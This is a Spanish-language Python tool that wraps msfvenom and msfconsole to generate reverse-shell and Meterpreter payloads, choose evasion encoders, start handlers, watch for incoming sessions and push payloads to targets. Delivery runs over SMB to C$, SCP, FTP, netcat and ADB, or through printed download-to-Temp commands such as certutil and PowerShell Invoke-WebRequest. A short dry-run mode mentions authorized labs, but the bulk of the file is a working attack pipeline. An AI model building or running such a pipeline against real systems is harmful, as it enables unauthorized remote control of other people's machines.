#!/usr/bin/env python3

# -*- coding: utf-8 -*-

"""

MSFVenom Payload Generator v4.0

+ Auto Listener (msfconsole)

+ Monitor de sesiones en tiempo real

+ Envío automático según objetivo

Uso: python3 msfvenom_generator.py

"""



import subprocess

import os

import sys

import time

import threading

import functools
import http.server
import socketserver
import socket


from datetime import datetime

from pathlib import Path





# ============================================================================

# SERVIDOR HTTP LOCAL (para distribuir payloads)

# ============================================================================

class PayloadHTTPServer:

    """Servidor HTTP simple para entregar payloads al objetivo."""



    def __init__(self, directorio="payloads", puerto=8080, host="127.0.0.1"):

        self.directorio = os.path.abspath(directorio)

        self.puerto = puerto

        self.host = host

        self.httpd = None

        self.thread = None



    def iniciar(self):

        handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=self.directorio)

        try:

            self.httpd = socketserver.TCPServer((self.host, self.puerto), handler)

        except OSError:

            print(f"[!] Puerto {self.puerto} ocupado, usando 8081...")

            self.puerto = 8081

            self.httpd = socketserver.TCPServer((self.host, self.puerto), handler)



        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)

        self.thread.start()



        ip_local = self._obtener_ip_local()

        print(f"[+] Servidor HTTP iniciado:")

        print(f"    http://{ip_local}:{self.puerto}/")

        return ip_local



    def detener(self):

        if self.httpd:

            self.httpd.shutdown()
            self.httpd.server_close()
            self.httpd = None

            print("[+] Servidor HTTP detenido.")



    def _obtener_ip_local(self):

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        try:

            s.connect(("8.8.8.8", 80))

            return s.getsockname()[0]

        finally:

            s.close()





# ============================================================================

# MONITOR DE SESIONES MSF

# ============================================================================

class SessionMonitor:

    """Monitorea el log de msfconsole para detectar sesiones nuevas."""



    def __init__(self, callback_on_session=None):

        self.log_file = os.path.expanduser("~/.msf4/logs/framework.log")

        self.callback = callback_on_session

        self.posicion = 0

        self.sesiones_vistas = set()

        self.activo = False

        self.thread = None



    def iniciar(self):

        self.activo = True

        self.thread = threading.Thread(target=self._monitorear, daemon=True)

        self.thread.start()

        print("[+] Monitor de sesiones activo.")



    def detener(self):

        self.activo = False

        if self.thread:

            self.thread.join(timeout=2)



    def _monitorear(self):

        while self.activo:

            try:

                if not os.path.exists(self.log_file):

                    time.sleep(1)

                    continue



                with open(self.log_file, "r") as f:

                    f.seek(self.posicion)

                    contenido = f.read()

                    self.posicion = f.tell()



                if "Meterpreter session" in contenido or "Command shell session" in contenido:

                    self._procesar(contenido)

            except Exception as e:

                print(f"[!] Error del monitor: {e}", file=sys.stderr)

            time.sleep(0.5)



    def _procesar(self, contenido):

        import re

        patron = re.compile(

            r"((?:Meterpreter|Command shell) session\s+(\d+)\s+opened.*?(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}))",

            re.IGNORECASE

        )

        for match in patron.finditer(contenido):

            sid = match.group(2)

            ip = match.group(3)

            if sid not in self.sesiones_vistas:

                self.sesiones_vistas.add(sid)

                info = {

                    "id": sid,

                    "tipo": "meterpreter" if "Meterpreter" in match.group(1) else "shell",

                    "ip": ip,

                    "timestamp": datetime.now().isoformat(),

                }

                self._notificar(info)



    def _notificar(self, info):

        print("\n" + "="*70)

        print("🎯 ¡¡¡ SESIÓN DETECTADA !!!".center(70))

        print("="*70)

        print(f"  ID      : {info['id']}")

        print(f"  Tipo    : {info['tipo']}")

        print(f"  Origen  : {info['ip']}")

        print(f"  Hora    : {info['timestamp']}")

        print("="*70 + "\n")



        # Pitido del sistema

        print("\a")



        if self.callback:

            self.callback(info)





# ============================================================================

# ENVIADOR DE PAYLOADS (dependiendo del objetivo)

# ============================================================================

class PayloadSender:

    """Envía el payload al objetivo según el método elegido."""



    def __init__(self, payload_path):

        self.payload_path = payload_path

        self.payload_name = os.path.basename(payload_path)



    def enviar_httpserver(self, ip_objetivo, puerto=8080):

        """Imprime comando para que el objetivo descargue el payload."""

        url = f"http://{ip_objetivo}:{puerto}/{self.payload_name}"

        print(f"\n[+] URL para descargar: {url}")

        print("\n[*] Comandos según plataforma del objetivo:")

        print(f"    Windows (PowerShell):")

        print(f'      powershell -c "Invoke-WebRequest -Uri \'{url}\' -OutFile C:\\Windows\\Temp\\{self.payload_name}"')

        print(f"    Linux:")

        print(f"      wget {url} -O /tmp/{self.payload_name}")

        print(f"      curl -o /tmp/{self.payload_name} {url}")

        print(f"    Windows (certutil):")

        print(f"      certutil -urlcache -split -f {url} %TEMP%\\{self.payload_name}")



    def enviar_scp(self, usuario, host, ruta_destino="/tmp/"):

        """Envía vía SCP."""

        destino = f"{usuario}@{host}:{ruta_destino}{self.payload_name}"

        cmd = ["scp", self.payload_path, destino]

        print(f"\n[*] SCP: {' '.join(cmd)}")

        return subprocess.run(cmd).returncode == 0



    def enviar_smb(self, usuario, password, host, share="C$"):

        """Envía vía SMB (smbclient)."""

        destino = f"\\\\{host}\\{share}\\Windows\\Temp\\{self.payload_name}"

        cmd = [

            "smbclient", f"//{host}/{share}",

            "-U", f"{usuario}%{password}",

            "-c", f"put {self.payload_path} {destino}",

        ]

        print(f"\n[*] SMB: {' '.join(cmd)}")

        return subprocess.run(cmd).returncode == 0



    def enviar_ftp(self, usuario, password, host, ruta_destino="/tmp/"):

        """Envía vía FTP."""

        cmd = [

            "ftp", "-n", host

        ]

        script = f"""user {usuario} {password}

binary

put {self.payload_path} {ruta_destino}{self.payload_name}

bye

"""

        print(f"\n[*] FTP -> {host}")

        return subprocess.run(cmd, input=script, text=True).returncode == 0



    def enviar_nc(self, host, puerto):

        """Envía vía Netcat sin invocar un intérprete de comandos."""

        if not str(host).strip() or not str(puerto).isdigit() or not 1 <= int(puerto) <= 65535:
            raise ValueError("host y puerto no válidos")
        cmd = ["nc", "-w", "3", str(host).strip(), str(int(puerto))]

        print(f"\n[*] Netcat: {' '.join(cmd)}")
        try:
            with open(self.payload_path, "rb") as payload:
                return subprocess.run(cmd, stdin=payload, check=False).returncode == 0
        except FileNotFoundError:
            print("[!] No se encontró nc.", file=sys.stderr)
            return False



    def enviar_adb(self, serial=None):

        """Envía vía ADB (Android)."""

        cmd = ["adb"]

        if serial:

            cmd += ["-s", serial]

        cmd += ["push", self.payload_path, f"/data/local/tmp/{self.payload_name}"]

        print(f"\n[*] ADB: {' '.join(cmd)}")

        return subprocess.run(cmd).returncode == 0



    def menu_envio(self):

        """Menú interactivo de envío."""

        print("\n" + "="*70)

        print(" MÉTODO DE ENVÍO DEL PAYLOAD")

        print("="*70)

        print("  [1] Servidor HTTP local + comando de descarga")

        print("  [2] SCP (Linux/Unix)")

        print("  [3] SMB (Windows - smbclient)")

        print("  [4] FTP")

        print("  [5] Netcat (raw)")

        print("  [6] ADB (Android)")

        print("  [0] No enviar ahora")

        print("="*70)



        opcion = input(">> ").strip()



        if opcion == "1":

            puerto = int(input("Puerto del servidor HTTP [8080]: ").strip() or "8080")

            ip_destino = input("IP del objetivo (o ENTER para local): ").strip()

            servidor = PayloadHTTPServer("payloads", puerto)

            ip_servidor = servidor.iniciar()

            if not ip_destino:

                ip_destino = ip_servidor

            self.enviar_httpserver(ip_destino, puerto)



        elif opcion == "2":

            usuario = input("Usuario SSH: ").strip()

            host = input("Host: ").strip()

            ruta = input("Ruta destino [/tmp/]: ").strip() or "/tmp/"

            self.enviar_scp(usuario, host, ruta)



        elif opcion == "3":

            usuario = input("Usuario SMB: ").strip()

            password = input("Password: ").strip()

            host = input("Host: ").strip()

            share = input("Share [C$]: ").strip() or "C$"

            self.enviar_smb(usuario, password, host, share)



        elif opcion == "4":

            usuario = input("Usuario FTP: ").strip()

            password = input("Password: ").strip()

            host = input("Host: ").strip()

            ruta = input("Ruta destino [/tmp/]: ").strip() or "/tmp/"

            self.enviar_ftp(usuario, password, host, ruta)



        elif opcion == "5":

            host = input("Host destino: ").strip()

            puerto = int(input("Puerto Netcat [4444]: ").strip() or "4444")

            print("[*] Asegúrate de tener un 'nc -lvnp <puerto>' en el destino.")

            self.enviar_nc(host, puerto)



        elif opcion == "6":

            serial = input("Serial ADB (ENTER para automático): ").strip() or None

            self.enviar_adb(serial)





# ============================================================================

# GENERADOR PRINCIPAL MSFVENOM (v3.0 + mejoras)

# ============================================================================

class MSFVenomGenerator:



    PLATAFORMAS = {

        "windows":"Windows", "linux":"Linux", "android":"Android",

        "osx":"macOS", "solaris":"Solaris", "bsd":"BSD", "openbsd":"OpenBSD",

        "freebsd":"FreeBSD", "netbsd":"NetBSD", "bsdi":"BSDi", "aix":"AIX",

        "hpux":"HPUX", "irix":"Irix", "unix":"Unix", "php":"PHP",

        "python":"Python", "ruby":"Ruby", "java":"Java", "javascript":"JavaScript",

        "nodejs":"NodeJS", "firefox":"Firefox", "netware":"Netware",

        "mainframe":"mainframe", "multi":"multi", "hardware":"hardware", "cisco":"Cisco",

    }



    FORMATOS_EJECUTABLES = [

        "asp", "aspx", "aspx-exe", "dll", "elf", "elf-so", "exe",

        "exe-only", "exe-service", "exe-small", "hta-psh", "loop-vbs",

        "macho", "msi", "msi-nouac", "osx-app", "psh", "psh-net",

        "psh-reflection", "psh-cmd", "vba", "vba-exe", "vba-psh",

        "vbs", "war",

    ]



    FORMATOS_TRANSFORMADOS = [

        "bash", "c", "csharp", "dw", "dword", "hex", "java",

        "js_be", "js_le", "num", "perl", "pl", "powershell",

        "ps1", "py", "python", "raw", "rb", "ruby", "sh",

        "vbapplication", "vbscript",

    ]



    ENCODERS = [

        "", "x86/shikata_ga_nai", "x86/alpha_mixed", "x86/alpha_upper",

        "x86/call4_dword_xor", "x86/countdown", "x86/fnstenv_mov",

        "x86/jmp_call_additive", "x86/nonalpha", "x86/nonupper",

        "x86/unicode_mixed", "x86/unicode_upper", "x64/xor",

        "x64/xor_dynamic", "x64/zutto_dekiru", "cmd/powershell_base64",

        "php/base64", "generic/eicar", "generic/none",

    ]



    def __init__(self):

        self.output_dir = "payloads"

        self.rc_dir = "rc_files"

        self.crear_directorios()

        self.monitor = None



    def crear_directorios(self):

        for d in (self.output_dir, self.rc_dir):

            if not os.path.exists(d):

                os.makedirs(d, exist_ok=True)



    def banner(self):

        print("="*70)

        print("   MSFVenom Payload Generator v4.0")

        print("   + Auto Listener + Monitor de Sesiones + Envío Automático")

        print("="*70)



    def limpiar_pantalla(self):

        os.system("cls" if os.name == "nt" else "clear")



    def input_seguro(self, msg, default=""):

        v = input(f"{msg} [{default}]: ").strip()

        return v if v else default



    def ejecutar(self, comando):

        print(f"\n[*] Comando: {' '.join(comando) if isinstance(comando, list) else comando}\n")

        try:

            p = subprocess.run(comando, capture_output=True, text=True, check=True)

            if p.stdout: print(p.stdout)

            if p.stderr: print(p.stderr)

            return True

        except subprocess.CalledProcessError as e:

            print(f"[!] Error:\n{e.stderr}"); return False

        except FileNotFoundError:

            print("[!] Comando no encontrado."); return False



    # ---------- Listados ----------

    def listar_payloads(self):    self.ejecutar(["msfvenom", "-l", "payloads"])

    def listar_encoders(self):    self.ejecutar(["msfvenom", "-l", "encoders"])

    def listar_nops(self):        self.ejecutar(["msfvenom", "-l", "nops"])

    def listar_formatos(self):    self.ejecutar(["msfvenom", "--help-formats"])

    def listar_plataformas(self): self.ejecutar(["msfvenom", "--help-platforms"])

    def opciones_payload(self, p): self.ejecutar(["msfvenom", "-p", p, "--payload-options"])



    # ---------- Resource file ----------

    def generar_resource_file(self, payload, lhost, lport):

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")

        rc_path = os.path.join(self.rc_dir, f"listener_{ts}.rc")

        contenido = [

            "use exploit/multi/handler",

            f"set PAYLOAD {payload}",

            f"set LHOST {lhost}",

            f"set LPORT {lport}",

            "set ExitOnSession false",

            "exploit -j -z",

            "",

        ]

        with open(rc_path, "w") as f:

            f.write("\n".join(contenido))

        return rc_path



    def lanzar_listener(self, rc_path, background=True):

        cmd = ["msfconsole", "-q", "-r", rc_path]

        print(f"\n[+] Lanzando: {' '.join(cmd)}")

        if background:

            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

            print(f"[+] Listener en background (PID: {p.pid})")

            time.sleep(3)

            # Activar monitor

            self.monitor = SessionMonitor()

            self.monitor.iniciar()

            return p

        else:

            self.ejecutar(cmd)

            return None



    def mostrar_comandos_ayuda(self, payload, lhost, lport):

        print("\n" + "="*70)

        print(" COMANDOS PARA EJECUTAR MANUALMENTE:")

        print("="*70)

        for l in [

            "use exploit/multi/handler",

            f"set PAYLOAD {payload}",

            f"set LHOST {lhost}",

            f"set LPORT {lport}",

            "set ExitOnSession false",

            "exploit -j -z",

        ]:

            print(f"  {l}")

        print("="*70 + "\n")



    # ---------- MSFVenom ----------

    def construir_cmd(self, payload, lhost, lport, fmt):

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")

        limpio = payload.replace("/", "_").replace("\\", "_")

        ext = self._extension(fmt)

        output = os.path.join(self.output_dir, f"{limpio}_{ts}.{ext}")

        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",

               "-f", fmt, "-o", output]

        return cmd, output



    def _extension(self, fmt):

        m = {

            "exe":"exe","exe-only":"exe","exe-small":"exe","exe-service":"exe",

            "dll":"dll","msi":"msi","msi-nouac":"msi","elf":"elf","elf-so":"so",

            "macho":"macho","osx-app":"app","asp":"asp","aspx":"aspx",

            "aspx-exe":"aspx","war":"war","hta-psh":"hta","psh":"ps1",

            "psh-net":"ps1","psh-reflection":"ps1","psh-cmd":"ps1",

            "vba":"vba","vba-exe":"vba","vba-psh":"vba","vbs":"vbs",

            "loop-vbs":"vbs","raw":"bin","c":"c","csharp":"cs","java":"java",

            "python":"py","py":"py","perl":"pl","pl":"pl","ruby":"rb",

            "rb":"rb","bash":"sh","sh":"sh","powershell":"ps1","ps1":"ps1",

            "hex":"txt","js_be":"js","js_le":"js","dw":"txt","dword":"txt",

            "num":"txt","vbscript":"vbs","vbapplication":"vbs",

        }

        return m.get(fmt, "bin")



    def opciones_avanzadas(self, cmd):

        print("\n--- Opciones Avanzadas (ENTER para omitir) ---")

        ops = {

            "1":("Encoder","-e",self.ENCODERS),

            "2":("Iteraciones","-i",None),

            "3":("Bad-chars","-b",None),

            "4":("Tamaño","-s",None),

            "5":("Nopsled","-n",None),

            "6":("Template","-x",None),

            "7":("Platform","--platform",None),

            "8":("Arquitectura","-a",None),

            "9":("Variable","-v",None),

        }

        for k,v in ops.items():

            print(f"  [{k}] {v[0]}")

        el = input("\nOpción (ENTER para terminar): ").strip()

        while el:

            if el in ops:

                n, flag, vals = ops[el]

                if vals:

                    for i, x in enumerate(vals):

                        print(f"   [{i}] {x if x else '(ninguno)'}")

                    idx = input("Número: ").strip()

                    if idx.isdigit() and int(idx)<len(vals) and vals[int(idx)]:

                        cmd.extend([flag, vals[int(idx)]])

                else:

                    v = input(f"{n}: ").strip()

                    if v: cmd.extend([flag, v])

            el = input("Otra opción (ENTER para terminar): ").strip()



        if input("\n¿Más pequeño posible? [s/N]: ").lower() == "s":

            cmd.append("--smallest")

        if input("¿Preservar template (-k)? [s/N]: ").lower() == "s":

            cmd.append("-k")

        return cmd



    def seleccionar_formato(self):

        print("\n--- Formatos ---")

        print(" EJECUTABLES:")

        for i,f in enumerate(self.FORMATOS_EJECUTABLES):

            print(f"   [{i:2d}] {f}")

        o = len(self.FORMATOS_EJECUTABLES)

        print(" TRANSFORMADOS:")

        for i,f in enumerate(self.FORMATOS_TRANSFORMADOS):

            print(f"   [{o+i:2d}] {f}")

        todos = self.FORMATOS_EJECUTABLES + self.FORMATOS_TRANSFORMADOS

        s = input("\nNúmero o nombre [raw]: ").strip()

        if not s: return "raw"

        if s.isdigit() and int(s)<len(todos): return todos[int(s)]

        return s



    # ---------- Generación completa ----------

    def generar(self, payload, formato=None):

        lhost = self.input_seguro("LHOST", "127.0.0.1")

        lport = self.input_seguro("LPORT", "4444")

        if not formato:

            formato = self.seleccionar_formato()



        cmd, output = self.construir_cmd(payload, lhost, lport, formato)

        cmd = self.opciones_avanzadas(cmd)



        print("\n" + "="*70)

        print(f"[+] Payload :  {payload}")

        print(f"[+] LHOST   :  {lhost}")

        print(f"[+] LPORT   :  {lport}")

        print(f"[+] Formato :  {formato}")

        print(f"[+] Salida  :  {output}")

        print("="*70)



        if not self.ejecutar(cmd):

            return None



        print(f"\n[✓] Payload: {output}")

        print(f"[✓] Tamaño : {os.path.getsize(output)} bytes\n")



        rc_path = self.generar_resource_file(payload, lhost, lport)

        self.mostrar_comandos_ayuda(payload, lhost, lport)



        print("[?] ¿Lanzar listener?")

        print("    [1] Sí, background (recomendado)")

        print("    [2] Sí, foreground (bloquea)")

        print("    [3] No, solo .rc")

        op = input(">> ").strip()

        proc = None

        if op == "1":

            proc = self.lanzar_listener(rc_path, True)

        elif op == "2":

            self.lanzar_listener(rc_path, False)



        # Ofrecer envío

        if input("\n[?] ¿Enviar el payload al objetivo ahora? [s/N]: ").lower() == "s":

            sender = PayloadSender(output)

            sender.menu_envio()



        return output



    def payload_rapido(self):

        print("\n--- Generación rápida ---")

        for k,v in self.PLATAFORMAS.items():

            print(f"  [{k:12}] {v}")

        plat = self.input_seguro("Plataforma", "windows").lower()

        sug = {

            "windows":"windows/x64/meterpreter/reverse_tcp",

            "linux":"linux/x64/shell_reverse_tcp",

            "android":"android/meterpreter_reverse_tcp",

            "osx":"osx/x64/shell_reverse_tcp",

            "php":"php/reverse_php",

            "python":"python/shell_reverse_tcp",

            "ruby":"ruby/shell_reverse_tcp",

            "java":"java/jsp_shell_reverse_tcp",

            "javascript":"nodejs/shell_reverse_tcp",

            "nodejs":"nodejs/shell_reverse_tcp",

            "bash":"cmd/unix/reverse_bash",

            "unix":"cmd/unix/reverse_bash",

        }

        p = self.input_seguro("Payload", sug.get(plat,""))

        if not p: return

        self.generar(p)



    def payload_personalizado(self):

        p = self.input_seguro("Payload")

        if p: self.generar(p)



    def opciones_payload_menu(self):

        p = self.input_seguro("Payload")

        if p: self.opciones_payload(p)



    def menu(self):

        self.banner()

        print("\n === INFORMACIÓN ===")

        print("  [L] Listar payloads")

        print("  [E] Listar encoders")

        print("  [N] Listar NOPs")

        print("  [F] Listar formatos")

        print("  [P] Listar plataformas")

        print("\n === GENERACIÓN ===")

        print("  [O] Ver opciones de un payload")

        print("  [R] Generación rápida por plataforma")

        print("  [C] Payload personalizado")

        print("\n  [0] Salir")

        return input("\n>> ").strip().lower()



    def run(self):

        a = {

            "l":self.listar_payloads, "e":self.listar_encoders,

            "n":self.listar_nops, "f":self.listar_formatos,

            "p":self.listar_plataformas, "o":self.opciones_payload_menu,

            "r":self.payload_rapido, "c":self.payload_personalizado,

        }

        while True:

            self.limpiar_pantalla()

            op = self.menu()

            if op == "0":

                if self.monitor: self.monitor.detener()

                print("\n[!] Saliendo..."); sys.exit(0)

            accion = a.get(op)

            if accion: accion()

            else: print("[!] Opción inválida.")

            input("\nENTER para continuar...")





def guided_flow() -> str:
    """Describe el flujo seguro sin ejecutar comandos externos."""
    return "\n".join([
        "MSFVenom Generator — ejecución guiada",
        "[1] Confirmar alcance escrito y usar una máquina de laboratorio desechable.",
        "[2] Revisar dependencias y comenzar con --dry-run.",
        "[3] Generar el artefacto solo tras una confirmación explícita.",
        "[4] Revisar hash, listener, red de laboratorio y procedimiento de cleanup.",
        "[5] Detener monitor, listener y servidor HTTP al terminar.",
    ])


def guided_preflight() -> int:
    """Valida dependencias locales sin lanzar listeners ni generar artefactos."""
    print(guided_flow())
    print("\nPreflight:")
    for command in ("python3", "msfvenom", "msfconsole"):
        available = __import__("shutil").which(command)
        print(f"  {'OK' if available else 'FALTA'}: {command}")
    print("  OK: no se ejecutaron comandos externos ni se crearon payloads.")
    return 0


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Generador MSFVenom para laboratorios autorizados")
    parser.add_argument("--guided", action="store_true", help="muestra el flujo y preflight sin efectos externos")
    parser.add_argument("--dry-run", action="store_true", help="alias seguro de --guided")
    args = parser.parse_args()

    if args.guided or args.dry_run:
        raise SystemExit(guided_preflight())

    try:

        MSFVenomGenerator().run()

    except KeyboardInterrupt:

        print("\n[!] Interrumpido.")

        sys.exit(0)
